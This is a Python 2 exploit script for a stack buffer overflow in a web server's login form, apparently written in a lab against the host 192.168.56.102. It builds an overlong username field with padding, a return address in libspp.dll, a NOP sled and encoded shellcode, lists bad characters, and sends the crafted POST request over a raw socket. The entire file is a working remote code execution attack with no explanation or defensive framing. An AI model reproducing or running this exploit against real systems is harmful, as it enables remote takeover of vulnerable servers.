#!/usr/bin/python

import socket

#ret =  0x10090c83 libspp.dll windows 10 enterprise
# \x00\x0a\x0d\x25\x26\x2b\x3d
shellcode=("\xda\xc6\xbd\x59\xab\x1e\xec\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
"\x52\x31\x6e\x17\x03\x6e\x17\x83\x9f\xaf\xfc\x19\xe3\x58\x82"
"\xe2\x1b\x99\xe3\x6b\xfe\xa8\x23\x0f\x8b\x9b\x93\x5b\xd9\x17"
"\x5f\x09\xc9\xac\x2d\x86\xfe\x05\x9b\xf0\x31\x95\xb0\xc1\x50"
"\x15\xcb\x15\xb2\x24\x04\x68\xb3\x61\x79\x81\xe1\x3a\xf5\x34"
"\x15\x4e\x43\x85\x9e\x1c\x45\x8d\x43\xd4\x64\xbc\xd2\x6e\x3f"
"\x1e\xd5\xa3\x4b\x17\xcd\xa0\x76\xe1\x66\x12\x0c\xf0\xae\x6a"
"\xed\x5f\x8f\x42\x1c\xa1\xc8\x65\xff\xd4\x20\x96\x82\xee\xf7"
"\xe4\x58\x7a\xe3\x4f\x2a\xdc\xcf\x6e\xff\xbb\x84\x7d\xb4\xc8"
"\xc2\x61\x4b\x1c\x79\x9d\xc0\xa3\xad\x17\x92\x87\x69\x73\x40"
"\xa9\x28\xd9\x27\xd6\x2a\x82\x98\x72\x21\x2f\xcc\x0e\x68\x38"
"\x21\x23\x92\xb8\x2d\x34\xe1\x8a\xf2\xee\x6d\xa7\x7b\x29\x6a"
"\xc8\x51\x8d\xe4\x37\x5a\xee\x2d\xfc\x0e\xbe\x45\xd5\x2e\x55"
"\x95\xda\xfa\xfa\xc5\x74\x55\xbb\xb5\x34\x05\x53\xdf\xba\x7a"
"\x43\xe0\x10\x13\xee\x1b\xf3\xdc\x47\x1b\x66\xb5\x95\x5b\x69"
"\xfe\x13\xbd\x03\x10\x72\x16\xbc\x89\xdf\xec\x5d\x55\xca\x89"
"\x5e\xdd\xf9\x6e\x10\x16\x77\x7c\xc5\xd6\xc2\xde\x40\xe8\xf8"
"\x76\x0e\x7b\x67\x86\x59\x60\x30\xd1\x0e\x56\x49\xb7\xa2\xc1"
"\xe3\xa5\x3e\x97\xcc\x6d\xe5\x64\xd2\x6c\x68\xd0\xf0\x7e\xb4"
"\xd9\xbc\x2a\x68\x8c\x6a\x84\xce\x66\xdd\x7e\x99\xd5\xb7\x16"
"\x5c\x16\x08\x60\x61\x73\xfe\x8c\xd0\x2a\x47\xb3\xdd\xba\x4f"
"\xcc\x03\x5b\xaf\x07\x80\x7b\x52\x8d\xfd\x13\xcb\x44\xbc\x79"
"\xec\xb3\x83\x87\x6f\x31\x7c\x7c\x6f\x30\x79\x38\x37\xa9\xf3"
"\x51\xd2\xcd\xa0\x52\xf7")

dados = "A" * 780 + "\x83\x0c\x09\x10" + "\x90"  * 16 + shellcode
tam = len(dados) + 20

request="POST /login HTTP/1.1\r\n"
request+="Host: 192.168.56.102\r\n"
request+="User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\n"
request+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
request+="Accept-Language: en-US,en;q=0.5\r\n"
request+="Accept-Encoding: gzip, deflate\r\n"
request+="Content-Type: application/x-www-form-urlencoded\r\n"
#request+="Content-Length: 1020 \r\n"
request+="Content-Length: "+str(tam)+" \r\n"
#request+="DNT: 1\r\n"
request+="Origin: http://192.168.56.102\r\n"
request+="Connection: close\r\n"
request+="Referer: http://192.168.56.102/login\r\n"
request+="Upgrade-Insecure-Requests: 1\r\n"
request+="\r\n"
#request+="username=a&password=A"
request+="username="+dados+"&password=A"


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.56.102",80))
s.send(request)   
print s.recv(1024)
#s.close()
